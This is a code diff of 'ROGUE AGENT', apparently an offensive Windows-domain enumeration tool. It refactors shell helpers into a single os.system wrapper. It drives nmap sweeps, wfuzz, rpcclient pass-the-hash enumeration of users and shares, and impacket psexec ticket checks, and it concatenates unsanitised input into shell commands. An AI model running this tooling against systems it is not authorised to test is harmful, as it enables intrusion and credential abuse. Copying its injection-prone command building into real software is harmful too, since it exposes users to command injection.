@@ -63,11 +63,11 @@ else:
 # -------------------------------------------------------------------------------------
 
 def cutLine(variable1, variable2):
-   localCOM("sed -i '/" + variable1 + "/d' ./" + variable2)
+   runCommand("sed -i '/" + variable1 + "/d' ./" + variable2)
    return
    
 def parsFile(variable):
-   localCOM("sed -i '/^$/d' ./" + variable)
+   runCommand("sed -i '/^$/d' ./" + variable)
    return
 
 def test_DNS():
@@ -134,12 +134,12 @@ def test_TSH():
       return 0
       
 def lineCount(variable):
-   localCOM("cat " + variable + " | wc -l > count1.tmp")
+   runCommand("cat " + variable + " | wc -l > count1.tmp")
    count = (linecache.getline("count1.tmp", 1).rstrip("\n"))
    if count == 0:
       return int(count)
    else:
-      localCOM("grep --regexp='$' --count " + variable + " > count2.tmp")
+      runCommand("grep --regexp='$' --count " + variable + " > count2.tmp")
       count = (linecache.getline("count2.tmp", 1).rstrip("\n"))
    return int(count)
 
@@ -174,27 +174,16 @@ def getPort():
       print("[-] Sorry, I do not understand the value " + port + "...")
       return 1
 
-def remotCOM(variable):
+def runCommand(variable):
    if proxyChains == 1:
       print("[i] Proxychains enabled...")
       variable = "proxychains4 " + variable
    if xParameter == "bughunt":
-      print(colored(variable, colour5))
-      os.system(variable)
-   if xParameter == "commandsonly":
-      print(colored(variable, colour5))
-   if xParameter == "":
-      os.system(variable)   
-   return
-   
-def localCOM(variable):
-   if xParameter == "bughunt":
-      print(colored(variable, colour5))
-      os.system(variable)
-   if xParameter == "commandsonly":
-      print(colored(variable, colour5))
-   if xParameter == "":
-      os.system(variable)
+      print(colored("[i] Running command: " + variable, colour5))
+   if xParameter == "commandOnly":
+      print(colored("[i] Running command: " + variable, colour5))
+      return
+   os.system(variable)   
    return
  
 def prompt():
@@ -202,8 +191,8 @@ def prompt():
    return
    
 def wipeTokens(VALD):
-   localCOM("rm    " + dataDir + "/tokens.txt")
-   localCOM("touch " + dataDir + "/tokens.txt") 
+   runCommand("rm    " + dataDir + "/tokens.txt")
+   runCommand("touch " + dataDir + "/tokens.txt") 
    for x in range(0, maxUser):
       VALD[x] = "0"
    return
@@ -214,26 +203,26 @@ def nmapTrim(variable):
    cutLine("Host is up, received", variable)
    cutLine("STATE SERVICE", variable)
    cutLine("Nmap done", variable)
-   localCOM("awk '/Service Info/' " + variable + " > service.tmp")
+   runCommand("awk '/Service Info/' " + variable + " > service.tmp")
    cutLine("Service Info", variable)
    cutLine("Service detection performed", variable)   
    return
    
 def saveParams():
-   localCOM("echo '" + OSF + "' | base64 --wrap=0 >  base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + COM + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + DNS + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + TIP + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")   
-   localCOM("echo '" + PTS + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + WEB + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + USR + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + PAS + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + NTM + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + TGT + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")   
-   localCOM("echo '" + DOM + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + SID + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")
-   localCOM("echo '" + FIL + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")   
-   localCOM("echo '" + TSH + "' | base64 --wrap=0 >> base64.tmp"); localCOM("echo '\n' >> base64.tmp")    
+   runCommand("echo '" + OSF + "' | base64 --wrap=0 >  base64.tmp"); runCommand("echo '\n' >> base64.tmp")
+   runCommand("echo '" + COM + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
+   runCommand("echo '" + DNS + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
+   runCommand("echo '" + TIP + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")   
+   runCommand("echo '" + PTS + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
+   runCommand("echo '" + WEB + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
+   runCommand("echo '" + USR + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
+   runCommand("echo '" + PAS + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
+   runCommand("echo '" + NTM + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
+   runCommand("echo '" + TGT + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")   
+   runCommand("echo '" + DOM + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
+   runCommand("echo '" + SID + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
+   runCommand("echo '" + FIL + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")   
+   runCommand("echo '" + TSH + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")    
    parsFile("base64.tmp")    
    OSF2 = linecache.getline("base64.tmp", 1).rstrip("\n")  
    COM2 = linecache.getline("base64.tmp", 2).rstrip("\n")
@@ -266,7 +255,7 @@ def saveParams():
    return
      
 def privCheck():
-   localCOM("ls  | grep ccache > ticket.tmp")   
+   runCommand("ls  | grep ccache > ticket.tmp")   
    count = lineCount("ticket.tmp")   
    if count > 1:
       print("[i] More than one ticket was found...")            
@@ -274,9 +263,9 @@ def privCheck():
       ticket = linecache.getline("ticket.tmp", x).rstrip("\n")
       ticket = ticket.rstrip(" ")
       if ticket != "":
-         localCOM("export KRB5CCNAME=" + ticket)
+         runCommand("export KRB5CCNAME=" + ticket)
          print(colored("[*] Checking ticket status for " + ticket + "...", colour3))
-         remotCOM(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
+         runCommand(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
       else:
          print("[-] Unable to find a valid ticket...")
       return spacePadding(ticket, COL1)
@@ -284,20 +273,12 @@ def privCheck():
 def checkPorts(PTS, POR):
    checkParams = test_TIP()
    if checkParams != 1:   
-      print(colored("[*] Attempting to enumerate live ports, please wait as this can take a long time...", colour3))
-#      print("[+] Performing a fast scan...")
-      remotCOM("nmap " + IP46 + " -p- -T4 " + TIP.rstrip(" ") + " --open > light.tmp")
-      localCOM("cat light.tmp | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$// > lightports.tmp")
-#      catsFile("lightports.tmp")
-#      print("\n[+] Performing a slow scan...")    
-#      remotCOM("nmap " + IP46 + " -p- -sTU -T4 --min-rate=1000 --open " + TIP.rstrip(" ") + " > heavy1.tmp")      
-#      localCOM("cat lightports.tmp | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$// > heavy2.tmp")      
-#      localCOM("cat heavy2.tmp | sed -e $'s/,/\\\n/g' | sort -nu | tr '\n' ',' | sed 's/.$//' > heavyports.tmp 2>&1")     
-      PTS = linecache.getline("lightports.tmp", 1).rstrip("\n")            
+      print(colored("[*] Attempting to enumerate all open ports, please wait as this can take a long time...", colour3))
+      runCommand("nmap " + IP46 + " -p- -T4 " + TIP.rstrip(" ") + " --open > open.tmp")
+      runCommand("cat open.tmp | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$// > openports.tmp")
+      PTS = linecache.getline("openports.tmp", 1).rstrip("\n")            
       if PTS[:1] == "":
          print("[-] Unable to enumerate any port information, good luck!!...")
-#         PTS = linecache.getline("lightports.tmp", 1).rstrip("\n")                  
-#         if PTS == "":
          PTS = "EMPTY"
       else:
          print("[+] Found live ports...\n")
@@ -311,7 +292,7 @@ def squidCheck():
       return
    else:
       if proxyChains == 0:
-         remotCOM("wfuzz -t32 -z range,1-65535 -p '" + TIP.rstrip(" ") + ":3128' --hc 503 http://localhost:FUZZ/ > squid.tmp  2>&1")
+         runCommand("wfuzz -t32 -z range,1-65535 -p '" + TIP.rstrip(" ") + ":3128' --hc 503 http://localhost:FUZZ/ > squid.tmp  2>&1")
          catsFile("squid.tmp | grep '\"'")
       else:
          print("[-] Unable to enumerate hidden ports, proxychains enabled...")
@@ -346,16 +327,16 @@ def checkInterface(variable, COM):
       print("[-] No responce from network interface, checking remote host instead...")
       COM = spacePadding("UNKNOWN", COL0)      
       if variable == "DNS":
-           remotCOM("ping -c 5 " + DNS.rstrip(" ") + " > ping.tmp")
+           runCommand("ping -c 5 " + DNS.rstrip(" ") + " > ping.tmp")
       if variable == "TIP":
-           remotCOM("ping -c 5 " + TIP.rstrip(" ") + " > ping.tmp")           
+           runCommand("ping -c 5 " + TIP.rstrip(" ") + " > ping.tmp")           
       cutLine("PING","ping.tmp")
       cutLine("statistics","ping.tmp")
       parsFile("ping.tmp")
-      localCOM("sed -i '$d' ./ping.tmp")      
+      runCommand("sed -i '$d' ./ping.tmp")      
       count = lineCount("ping.tmp")
       nullTest = linecache.getline("ping.tmp", count).rstrip("\n")
-      localCOM("sed -i '$d' ./ping.tmp")
+      runCommand("sed -i '$d' ./ping.tmp")
       catsFile("ping.tmp") 
       if nullTest != "":
          print ("[+] " + nullTest + "...")
@@ -369,9 +350,9 @@ def checkBIOS():
       return
    else:
       print(colored("[*] Checking windows network neighborhood protocol...", colour3))
-      remotCOM("nbtscan -rv " + TIP.rstrip(" ") + " > bios.tmp")
-      localCOM("sed -i '/Doing NBT name scan for addresses from/d' ./bios.tmp")
-      localCOM("sed -i '/^$/d' ./bios.tmp")
+      runCommand("nbtscan -rv " + TIP.rstrip(" ") + " > bios.tmp")
+      runCommand("sed -i '/Doing NBT name scan for addresses from/d' ./bios.tmp")
+      runCommand("sed -i '/^$/d' ./bios.tmp")
       nullTest = linecache.getline("bios.tmp", 1).rstrip("\n")
       if nullTest == "":
          print("[-] No netbios information found...")
@@ -382,12 +363,12 @@ def checkBIOS():
    
 def checkWAF():
       print(colored("[*] Checking to see if a Web Application Firewall (WAF) has been installed...", colour3))
-      remotCOM("wafw00f -a https://" + TIP.rstrip(" ") + " -o waf.tmp > tmp.tmp 2>&1")
+      runCommand("wafw00f -a https://" + TIP.rstrip(" ") + " -o waf.tmp > tmp.tmp 2>&1")
       waf = linecache.getline("waf.tmp", 1).rstrip("\n")
       if waf != "":
          print(colored("\n" + waf.lstrip(" "), colour6))
       else:
-         print(colored("\nSomething went wrong!!...", colour6))
+         print("[-] Site " + TIP.rstrip(" ") + " appears to be down...")
       return
    
 def networkSweep():
@@ -396,15 +377,15 @@ def networkSweep():
    else:
       bit1, bit2, bit3, bit4 = TIP.split(".")
       print(colored("[*] Attempting to enumerate all hosts on this network range, please wait...", colour3))
-      remotCOM("nmap -v -sn " + bit1 + "." + bit2 + "." + bit3 + ".1-254 -oG pingsweep.tmp > temp.tmp 2>&1")
-      localCOM('grep Up pingsweep.tmp | cut -d " " -f 2 > hosts.tmp')
+      runCommand("nmap -v -sn " + bit1 + "." + bit2 + "." + bit3 + ".1-254 -oG pingsweep.tmp > temp.tmp 2>&1")
+      runCommand('grep Up pingsweep.tmp | cut -d " " -f 2 > hosts.tmp')
       nullTest = linecache.getline("hosts.tmp", 1).rstrip("\n")
       if nullTest == "":
          print("[-] No live hosts found...")
       else:
          print("[+] Found live hosts...")         
          the_list = []
-         localCOM("echo '" + Green + "'")         
+         runCommand("echo '" + Green + "'")         
          with open("hosts.tmp") as file:
             for line in file:
                line = line.rstrip("\n")
@@ -417,39 +398,38 @@ def networkSweep():
                   print(item.ljust(18), end =' ')
                if count % num_columns == 0:
                   print("")        
-   localCOM("echo '" + Reset + "'")
+   runCommand("echo '" + Reset + "'")
    return      
    
 def catsFile(variable):
    count = lineCount(variable)
    if count > 0:
-      localCOM("echo '" + Green + "'")
-      localCOM("cat " + variable)
-      localCOM("echo '" + Reset + "'")
+      runCommand("echo '" + Green + "'")
+      runCommand("cat " + variable)
+      runCommand("echo '" + Reset + "'")
    return   
    
-def timeSync(SKEW):
+def ServerSync(localTime):
    print(colored("[*] Attempting to synchronise time with remote server...", colour3))
-   checkParams = test_PRT("88")
-   
+   checkParams = test_PRT("88")   
    if checkParams == 1:
       return
    else:
-      remotCOM("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" ") + " | grep 'server time' | sed 's/^.*: //' > time.tmp")
+      runCommand("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" ") + " | grep 'server time' | sed 's/^.*: //' > time.tmp")
       dateTime = linecache.getline("time.tmp", 1).rstrip("\n")
       if dateTime != "":
          print("[+] Synchronised with remote server...")
          date, time = dateTime.split(" ")
          time = time.rstrip(")")
-         localCOM("echo '" + Green + "'")
-         localCOM("timedatectl set-time " + date)
-         localCOM("date --set=" + time)
-         localCOM("echo '" + Reset + "'")
+         runCommand("echo '" + Green + "'")
+         runCommand("timedatectl set-time " + date)
+         runCommand("date --set=" + time)
+         runCommand("echo '" + Reset + "'")
          LTM = time
-         SKEW = 1
+         localTime = 1
       else:
          print("[-] Server synchronisation did not occur...")
-   return SKEW                     
+   return localTime                     
 
 def registryKeys():
    print("\tHKEY_CLASSES_ROOT   HKCR")
@@ -516,14 +496,14 @@ def dispBanner(variable,flash):
    ascii_banner = pyfiglet.figlet_format(variable).upper()
    ascii_banner = ascii_banner.rstrip("\n")
    if flash == 1:
-      localCOM("clear")
+      runCommand("clear")
       print(colored(ascii_banner,colour0, attrs=['bold']))
-   localCOM("pyfiglet " + variable + " > banner.tmp")
+   runCommand("pyfiglet " + variable + " > banner.tmp")
    return
    
 def dispSubMenu(variable):
    variable = spacePadding(variable,163)
-   localCOM("clear")
+   runCommand("clear")
    dispMenu()
    options()
    print('\u2554' + ('\u2550')*163 + '\u2557')
@@ -532,14 +512,14 @@ def dispSubMenu(variable):
    return
    
 def clearClutter():
-   localCOM("rm *.tmp")
+   runCommand("rm *.tmp")
    linecache.clearcache()
    return
 
 def dispMenu():
    print('\u2554' + ('\u2550')*14 + '\u2566' + ('\u2550')*42 + '\u2566' + ('\u2550')*46 + '\u2566' + ('\u2550')*58 + '\u2557')
    print('\u2551' + " TIME ", end =' ')   
-   if SKEW == 0:
+   if localTime == 0:
       print(colored(LTM[:6],colour7), end=' ')
    else:
       print(colored(LTM[:6],colour6), end=' ')      
@@ -856,7 +836,7 @@ httpDir = "TREADSTONE"
 workDir = "BLACKBRIAR"
 explDir = "OUTCOME"
 powrDir = "LARX"
-fileExt = "py,sh,js,xlsx,docx,doc,txt,xml,bak,zip,php,html,pdf,dat"	# FILE EXTENSIONS
+fileExt = "py,sh,js,xlsx,docx,doc,txt,xml,bak,zip,php,html,htm,pdf,dat,asp"	# FILE EXTENSIONS
 keyPath = "python3 /usr/share/doc/python3-impacket/examples/"		# PATH 2 IMPACKET
 
 # -------------------------------------------------------------------------------------
@@ -900,7 +880,7 @@ else:
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-localCOM("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return")
+runCommand("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return")
 dispBanner("ROGUE  AGENT",1)
 print(colored("\t\tT R E A D S T O N E  E D I T I O N",colour7,attrs=['bold']))
 print(colored("\n\n[*] Booting, please wait...", colour3))
@@ -923,31 +903,31 @@ for x in range(0, len(dirList)):
       print("[+] Directory " + dirList[x] + " already exists...")               
 print("[+] Populating system variables...")
 if not os.path.exists(dataDir + "/usernames.txt"):			
-   localCOM("touch " + dataDir + "/usernames.txt")
+   runCommand("touch " + dataDir + "/usernames.txt")
    print("[+] File usernames.txt created...")
 else:
    print("[+] File usernames.txt already exists...")       
 if not os.path.exists(dataDir + "/passwords.txt"):			
-   localCOM("touch " + dataDir + "/passwords.txt")
+   runCommand("touch " + dataDir + "/passwords.txt")
    print("[+] File passwords.txt created...")
 else:
    print("[+] File passwords.txt already exists...")      
 if not os.path.exists(dataDir + "/hashes.txt"):			
-   localCOM("touch " + dataDir + "/hashes.txt")
+   runCommand("touch " + dataDir + "/hashes.txt")
    print("[+] File hashes.txt created...")
 else:
    print("[+] File hashes.txt already exists...")        
 if not os.path.exists(dataDir + "/shares.txt"):
-   localCOM("touch " + dataDir + "/shares.txt")
+   runCommand("touch " + dataDir + "/shares.txt")
    print("[+] File shares.txt created...")
 else:
    print("[+] File shares.txt already exists...")        
 if not os.path.exists(dataDir + "/tokens.txt"):
-   localCOM("touch " + dataDir + "/tokens.txt")
+   runCommand("touch " + dataDir + "/tokens.txt")
    print("[+] File tokens.txt created...")
 else:
    print("[+] File tokens.txt already exists...")   
-SKEW = 0                                # TIME-SKEW SWITCH
+localTime = 0                                # TIME-localTime SWITCH
 DOMC = 0                                # DOMAIN SWITCH
 DNSC = 0                                # DNS SWITCH
 HTTP = 0				# HTTP SERVER PORT
@@ -972,20 +952,20 @@ VALD = ["0"*COL5]*maxUser		# USER TOKENS
 
 print("[+] Configuration database found - restoring saved data....")
 col = cursor.execute("SELECT * FROM REMOTETARGET WHERE IDS = 1").fetchone()
-localCOM("echo " + col[1]  + " | base64 -d >  ascii.tmp")
-localCOM("echo " + col[2]  + " | base64 -d >> ascii.tmp")
-localCOM("echo " + col[3]  + " | base64 -d >> ascii.tmp")
-localCOM("echo " + col[4]  + " | base64 -d >> ascii.tmp")
-localCOM("echo " + col[5]  + " | base64 -d >> ascii.tmp")
-localCOM("echo " + col[6]  + " | base64 -d >> ascii.tmp")
-localCOM("echo " + col[7]  + " | base64 -d >> ascii.tmp")
-localCOM("echo " + col[8]  + " | base64 -d >> ascii.tmp")
-localCOM("echo " + col[9]  + " | base64 -d >> ascii.tmp")
-localCOM("echo " + col[10] + " | base64 -d >> ascii.tmp")
-localCOM("echo " + col[11] + " | base64 -d >> ascii.tmp")
-localCOM("echo " + col[12] + " | base64 -d >> ascii.tmp")
-localCOM("echo " + col[13] + " | base64 -d >> ascii.tmp")
-localCOM("echo " + col[14] + " | base64 -d >> ascii.tmp")
+runCommand("echo " + col[1]  + " | base64 -d >  ascii.tmp")
+runCommand("echo " + col[2]  + " | base64 -d >> ascii.tmp")
+runCommand("echo " + col[3]  + " | base64 -d >> ascii.tmp")
+runCommand("echo " + col[4]  + " | base64 -d >> ascii.tmp")
+runCommand("echo " + col[5]  + " | base64 -d >> ascii.tmp")
+runCommand("echo " + col[6]  + " | base64 -d >> ascii.tmp")
+runCommand("echo " + col[7]  + " | base64 -d >> ascii.tmp")
+runCommand("echo " + col[8]  + " | base64 -d >> ascii.tmp")
+runCommand("echo " + col[9]  + " | base64 -d >> ascii.tmp")
+runCommand("echo " + col[10] + " | base64 -d >> ascii.tmp")
+runCommand("echo " + col[11] + " | base64 -d >> ascii.tmp")
+runCommand("echo " + col[12] + " | base64 -d >> ascii.tmp")
+runCommand("echo " + col[13] + " | base64 -d >> ascii.tmp")
+runCommand("echo " + col[14] + " | base64 -d >> ascii.tmp")
 OSF = linecache.getline("ascii.tmp", 1).rstrip("\n")
 COM = linecache.getline("ascii.tmp", 2).rstrip("\n")
 DNS = linecache.getline("ascii.tmp", 3).rstrip("\n")
@@ -1039,10 +1019,10 @@ with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt
       HASH[x] = spacePadding(HASH[x], COL4)    
       VALD[x] = spacePadding(VALD[x], COL5)
 if DNS[:5] != "EMPTY":
-   localCOM("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
+   runCommand("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
    DNSC = 1
 if DOM[:5] != "EMPTY":
-   localCOM("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
+   runCommand("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
    DOMC = 1        
 count = TIP.count(':')      
 if count > 1:
@@ -1064,7 +1044,7 @@ while True:
    clearClutter()
    checkParams = 0							# RESET'S VALUE
    LTM = getTime()							# GET CLOCKTIME
-   localCOM("clear")							# CLEARS SCREEN
+   runCommand("clear")							# CLEARS SCREEN
    dispMenu()								# DISPLAY UPPER
    options()								# DISPLAY LOWER
    selection=input("[?] Please select an option: ")			# SELECT CHOICE
@@ -1081,13 +1061,13 @@ while True:
       PTS = checkPorts(PTS, POR)
       POR = spacePadding(PTS, COL1)      
       squidCheck()
-      SKEW = timeSync(SKEW)      
+      localTime = ServerSync(localTime)      
       print(colored("[*] Attempting to connect to rpcclient...", colour3))                                             
       if NTM[:5] != "EMPTY": 
          print("[i] Using HASH value as password credential for rpcclient...")
-         remotCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
+         runCommand("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
       else:
-         remotCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")     
+         runCommand("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")     
       errorCheck = linecache.getline("lsaquery.tmp", 1)                              
       if (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
          print("[-] Unable to connect to RPC data...")
@@ -1111,11 +1091,11 @@ while True:
  
          if DOMC == 1:
             print("\n[*] Resetting current domain associated host...")
-            localCOM("sed -i '$d' /etc/hosts")
-            localCOM("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
+            runCommand("sed -i '$d' /etc/hosts")
+            runCommand("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
             print("[+] Domain " + DOM.rstrip(" ") + " has successfully been added to /etc/hosts...")
          else:
-            localCOM("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
+            runCommand("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
             print("\n[+] Domain " + DOM.rstrip(" ") + " successfully added to /etc/hosts...")
             DOMC = 1                                
          print(colored("[*] Attempting to enumerate domain SID...", colour3))                        
@@ -1134,18 +1114,18 @@ while True:
          print(colored("[*] Attempting to enumerate shares...", colour3))                  
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
-            remotCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
+            runCommand("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
          else:
-            remotCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")               
+            runCommand("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")               
          errorCheck = linecache.getline("shares.tmp", 1)   
          if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
             print("[-] Access to RPC data restricted...")
          else:
             for x in range(0, maxUser):
                SHAR[x] = " "*COL2
-            localCOM("sed -i -n '/netname: /p' shares.tmp")
-            localCOM("sed -i '/^$/d' shares.tmp")
-            localCOM("cat shares.tmp | sort > sshares.tmp")            
+            runCommand("sed -i -n '/netname: /p' shares.tmp")
+            runCommand("sed -i '/^$/d' shares.tmp")
+            runCommand("cat shares.tmp | sort > sshares.tmp")            
             count = lineCount("sshares.tmp")                           
             if count > 0:
                print("[+] Found shares...\n")
@@ -1163,17 +1143,17 @@ while True:
          print(colored("[*] Attempting to enumerate domain users...", colour3))
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
-            remotCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
+            runCommand("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
          else:
-            remotCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")               
+            runCommand("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")               
          errorCheck = linecache.getline("domusers.tmp", 1)
          if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "result") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
             print("[-] Access to RPC data restricted...")
          else:               
-            localCOM("rm " + dataDir + "/usernames.txt")
-            localCOM("rm " + dataDir + "/hashes.txt")                   
-            localCOM("sort domusers.tmp > sdomusers.tmp")
-            localCOM("sed -i '/^$/d' sdomusers.tmp")            
+            runCommand("rm " + dataDir + "/usernames.txt")
+            runCommand("rm " + dataDir + "/hashes.txt")                   
+            runCommand("sort domusers.tmp > sdomusers.tmp")
+            runCommand("sed -i '/^$/d' sdomusers.tmp")            
             count2 = lineCount("sdomusers.tmp")             
             if count2 > 0:
                 print ("[+] Found users...\n")
@@ -1201,9 +1181,9 @@ while True:
             else:
                print("[+] Unable to enumerate domain users...")            
             print(colored("\n[*] Attempting to enumerate Guest password policy...", colour3))
-            remotCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'getusrdompwinfo " + rid + "' > policy.tmp")            
-            localCOM("sed -i '/ &info: struct samr_PwInfo/d' policy.tmp 2>&1")  
-            localCOM("sed -i '/^s*$/d' policy.tmp 2>&1")
+            runCommand("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'getusrdompwinfo " + rid + "' > policy.tmp")            
+            runCommand("sed -i '/ &info: struct samr_PwInfo/d' policy.tmp 2>&1")  
+            runCommand("sed -i '/^s*$/d' policy.tmp 2>&1")
             catsFile("policy.tmp")
       prompt()
       
@@ -1262,7 +1242,7 @@ while True:
          DNS = spacePadding(DNS, COL1)            
          if DNSC == 1:
             print("[+] Resetting current DNS IP association...")
-            localCOM("sed -i '$d' /etc/resolv.conf")
+            runCommand("sed -i '$d' /etc/resolv.conf")
             DNSC = 0            
          if DNSC == 0:
             if DNS[:5] != "EMPTY":
@@ -1274,7 +1254,7 @@ while True:
                   print("[+] Defaulting to IP 4...")
                   IP46 = "-4"                  
                print("[+] Adding DNS IP " + DNS.rstrip(" ") + " to /etc/resolv.conf...")
-               localCOM("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
+               runCommand("echo 'nameserver " + DNS.rstrip(" ") + "' >> /etc/resolv.conf")
                DNSC = 1               
          if DNSC == 1:
             COM = checkInterface("DNS", COM)
@@ -1293,46 +1273,45 @@ while True:
    if selection =='3':
       BAK = TIP
       TIP = input("[?] Please enter remote IP address: ").upper()
+      
       if ".CO" in TIP.upper():
-         localCOM("host " + TIP + " > host.tmp")
-         catsFile("host.tmp")
-         TIP = BAK 
+         runCommand("dig +short " + TIP + " > ip.tmp")
+         TIP = linecache.getline("ip.tmp", 1)
+      if TIP[:1] == "":
+         TIP = BAK
       else:
-         TIP = spacePadding(TIP, COL1)      
-         if TIP[:1] == " ":
-            TIP = BAK         
-         if TIP[:5] == "EMPTY":
-            print("[+] Remote IP address reset...")
-            COM = spacePadding("UNKNOWN", COL0)
-         else:
-            checkParams = 0
-            count = TIP.count(':')            
-            if count == 6:
-               try:
-                  bit1,bit2,bit3,bit4,bit5,bit6,bit7 = TIP.split(":")
-                  print("[+] Defualting to internet protocol 6...")
-                  IP46 = "-6"
-                  checkParams = 1
-               except:
-                  print("[-] Unknown internet protocol...")
-                  TIP = spacePadding("EMPTY", COL1)                              
-            count = TIP.count(".")         
-            if count == 3:
-               try:
-                  bit1,bit2,bit3,bit4 = TIP.split(".")
-                  print("[+] Defaulting to internet protocol 4...")
-                  IP46 = "-4"
-                  checkParams = 1
-               except:
-                  print("[-] Unknown internet protocol...")
-                  TIP = spacePadding("EMPTY", COL1)                     
-            if checkParams == 1:
